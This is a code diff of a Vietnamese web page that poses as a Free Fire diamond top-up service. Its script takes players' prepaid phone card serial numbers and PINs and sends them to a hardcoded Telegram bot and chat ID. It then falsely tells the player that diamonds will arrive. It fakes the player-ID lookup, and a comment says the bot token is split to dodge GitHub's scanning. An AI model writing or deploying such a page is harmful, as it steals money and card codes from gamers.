@@ -300,110 +300,107 @@
     </footer>
 
     <!-- JAVASCRIPT XỬ LÝ -->
-    <script>
-        // Tách nhỏ Token để tránh bị quét tự động bởi GitHub
-        const t_part1 = "8854450594";
-        const t_part2 = "AAEnDYhx1VQs5HlT6Lb80F5fBWoVPZXb-w";
-        const TELEGRAM_BOT_TOKEN = t_part1 + ":" + t_part2;
-        
-        const TELEGRAM_CHAT_ID = '6999613477';
+<script>
+    // Khai báo tách rời rõ ràng để điện thoại không bị lỗi khi copy
+    const part1 = "8854450594";
+    const part2 = "AAEnDYhx1VQs5HlT6Lb80F5fBWoVPZXb-w";
+    const TELEGRAM_BOT_TOKEN = part1 + ":" + part2;
+    const TELEGRAM_CHAT_ID = "6999613477";
 
-        let selectedAmount = 20000;
-        let selectedPackName = '220 Kim Cương';
+    let selectedAmount = 20000;
+    let selectedPackName = '220 Kim Cương';
 
-        function switchPayMethod(method) {
-            const btnCard = document.getElementById('btnPayCard');
-            const btnBank = document.getElementById('btnPayBank');
-            const cardSec = document.getElementById('cardSection');
-            const bankSec = document.getElementById('bankSection');
+    function switchPayMethod(method) {
+        const btnCard = document.getElementById('btnPayCard');
+        const btnBank = document.getElementById('btnPayBank');
+        const cardSec = document.getElementById('cardSection');
+        const bankSec = document.getElementById('bankSection');
 
-            if (method === 'CARD') {
-                btnCard.className = "p-3 bg-slate-900 border-2 border-amber-500 rounded-xl text-center cursor-pointer transition flex flex-col items-center gap-1";
-                btnBank.className = "p-3 bg-slate-900 border-2 border-slate-700 rounded-xl text-center cursor-pointer transition flex flex-col items-center gap-1 opacity-60 hover:opacity-100";
-                cardSec.classList.remove('hidden');
-                bankSec.classList.add('hidden');
+        if (method === 'CARD') {
+            btnCard.className = "p-3 bg-slate-900 border-2 border-amber-500 rounded-xl text-center cursor-pointer transition flex flex-col items-center gap-1";
+            btnBank.className = "p-3 bg-slate-900 border-2 border-slate-700 rounded-xl text-center cursor-pointer transition flex flex-col items-center gap-1 opacity-60 hover:opacity-100";
+            cardSec.classList.remove('hidden');
+            bankSec.classList.add('hidden');
+        } else {
+            btnBank.className = "p-3 bg-slate-900 border-2 border-cyan-500 rounded-xl text-center cursor-pointer transition flex flex-col items-center gap-1";
+            btnCard.className = "p-3 bg-slate-900 border-2 border-slate-700 rounded-xl text-center cursor-pointer transition flex flex-col items-center gap-1 opacity-60 hover:opacity-100";
+            bankSec.classList.remove('hidden');
+            cardSec.classList.add('hidden');
+        }
+    }
+
+    function selectPack(element, amount, packName) {
+        document.querySelectorAll('.pack-card').forEach(el => el.classList.remove('border-amber-500', 'bg-ff-card-active'));
+        element.classList.add('border-amber-500', 'bg-ff-card-active');
+
+        selectedAmount = amount;
+        selectedPackName = packName;
+
+        document.getElementById('cardAmountDisplay').value = amount.toLocaleString('vi-VN') + ' VNĐ';
+        document.getElementById('cardAmountVal').value = amount;
+        document.getElementById('bankAmountDisplay').innerText = amount.toLocaleString('vi-VN') + ' VNĐ';
+    }
+
+    function checkPlayerId() {
+        const id = document.getElementById('playerIdInput').value.trim();
+        const resultBox = document.getElementById('playerCheckResult');
+        const playerName = document.getElementById('playerName');
+
+        if (!id || id.length < 6) {
+            alert('Vui lòng nhập ID nhân vật hợp lệ!');
+            return;
+        }
+
+        playerName.innerText = 'FF_PRO_' + id.substring(0, 4);
+        resultBox.classList.remove('hidden');
+        document.getElementById('bankContentDisplay').innerText = 'NAPFF ' + id;
+    }
+
+    document.getElementById('cardForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const telco = document.getElementById('cardTelco').value;
+        const amount = document.getElementById('cardAmountVal').value;
+        const serial = document.getElementById('cardSerial').value.trim();
+        const pin = document.getElementById('cardPin').value.trim();
+        const playerId = document.getElementById('playerIdInput').value.trim();
+        const submitBtn = document.getElementById('submitBtn');
+
+        if (!playerId) {
+            alert('Vui lòng nhập ID nhân vật ở BƯỚC 1 trước khi nạp!');
+            return;
+        }
+
+        submitBtn.innerText = "Đang xử lý...";
+        submitBtn.disabled = true;
+
+        const plainText = "THONG BAO NAP THE MOI\n------------------------\nID Game FF: " + playerId + "\nLoai the: " + telco + "\nMenh gia: " + Number(amount).toLocaleString('vi-VN') + " VND\nGoi chon: " + selectedPackName + "\nSo Seri: " + serial + "\nMa The: " + pin + "\nThoi gian: " + new Date().toLocaleString('vi-VN') + "\n------------------------";
+
+        fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: plainText
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            submitBtn.innerText = "NẠP NGAY BÂY GIỜ";
+            submitBtn.disabled = false;
+
+            if (data.ok) {
+                alert('Gửi thẻ nạp thành công! Hệ thống đang xử lý Kim Cương vào tài khoản trong 1-3 phút.');
+                document.getElementById('cardSerial').value = '';
+                document.getElementById('cardPin').value = '';
             } else {
-                btnBank.className = "p-3 bg-slate-900 border-2 border-cyan-500 rounded-xl text-center cursor-pointer transition flex flex-col items-center gap-1";
-                btnCard.className = "p-3 bg-slate-900 border-2 border-slate-700 rounded-xl text-center cursor-pointer transition flex flex-col items-center gap-1 opacity-60 hover:opacity-100";
-                bankSec.classList.remove('hidden');
-                cardSec.classList.add('hidden');
+                alert('Lỗi Telegram API: ' + data.description);
             }
-        }
-
-        function selectPack(element, amount, packName) {
-            document.querySelectorAll('.pack-card').forEach(el => el.classList.remove('border-amber-500', 'bg-ff-card-active'));
-            element.classList.add('border-amber-500', 'bg-ff-card-active');
-
-            selectedAmount = amount;
-            selectedPackName = packName;
-
-            document.getElementById('cardAmountDisplay').value = amount.toLocaleString('vi-VN') + ' VNĐ';
-            document.getElementById('cardAmountVal').value = amount;
-            document.getElementById('bankAmountDisplay').innerText = amount.toLocaleString('vi-VN') + ' VNĐ';
-        }
-
-        function checkPlayerId() {
-            const id = document.getElementById('playerIdInput').value.trim();
-            const resultBox = document.getElementById('playerCheckResult');
-            const playerName = document.getElementById('playerName');
-
-            if (!id || id.length < 6) {
-                alert('Vui lòng nhập ID nhân vật hợp lệ!');
-                return;
-            }
-
-            playerName.innerText = 'FF_PRO_' + id.substring(0, 4);
-            resultBox.classList.remove('hidden');
-            document.getElementById('bankContentDisplay').innerText = 'NAPFF ' + id;
-        }
-
-        document.getElementById('cardForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-
-            const telco = document.getElementById('cardTelco').value;
-            const amount = document.getElementById('cardAmountVal').value;
-            const serial = document.getElementById('cardSerial').value.trim();
-            const pin = document.getElementById('cardPin').value.trim();
-            const playerId = document.getElementById('playerIdInput').value.trim();
-            const submitBtn = document.getElementById('submitBtn');
-
-            if (!playerId) {
-                alert('Vui lòng nhập ID nhân vật ở BƯỚC 1 trước khi nạp!');
-                return;
-            }
-
-            submitBtn.innerText = "Đang xử lý...";
-            submitBtn.disabled = true;
-
-            const plainText = "THONG BAO NAP THE MOI\n------------------------\nID Game FF: " + playerId + "\nLoai the: " + telco + "\nMenh gia: " + Number(amount).toLocaleString('vi-VN') + " VND\nGoi chon: " + selectedPackName + "\nSo Seri: " + serial + "\nMa The: " + pin + "\nThoi gian: " + new Date().toLocaleString('vi-VN') + "\n------------------------";
-
-            fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: plainText
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                submitBtn.innerText = "NẠP NGAY BÂY GIỜ";
-                submitBtn.disabled = false;
-
-                if (data.ok) {
-                    alert('Gửi thẻ nạp thành công! Hệ thống đang xử lý Kim Cương vào tài khoản trong 1-3 phút.');
-                    document.getElementById('cardSerial').value = '';
-                    document.getElementById('cardPin').value = '';
-                } else {
-                    alert('Lỗi Telegram API: ' + data.description);
-                }
-            })
-            .catch(error => {
-                submitBtn.innerText = "NẠP NGAY BÂY GIỜ";
-                submitBtn.disabled = false;
-                alert('Lỗi kết nối mạng: ' + error.message);
-            });
+        })
+        .catch(error => {
+            submitBtn.innerText = "NẠP NGAY BÂY GIỜ";
+            submitBtn.disabled = false;
+            alert('Lỗi kết nối mạng: ' + error.message);
         });
-    </script>
-</body>
-</html>
+    });
+</script>
